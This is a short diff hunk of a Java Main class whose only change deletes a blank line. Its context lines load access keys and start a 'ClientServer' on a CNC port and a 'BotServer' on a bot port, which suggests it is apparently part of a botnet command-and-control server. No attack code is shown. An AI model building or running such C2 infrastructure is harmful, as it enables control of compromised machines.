@@ -56,7 +56,6 @@ public class Main {
             }
 
             Utilities.sendInternalMessage("Fetched ["+AccessKeysFile.getAccessKeys().size()+"] Access-Keys...");
-
             new ClientServer(cncPort).start();
             new BotServer(botPort).start();
 
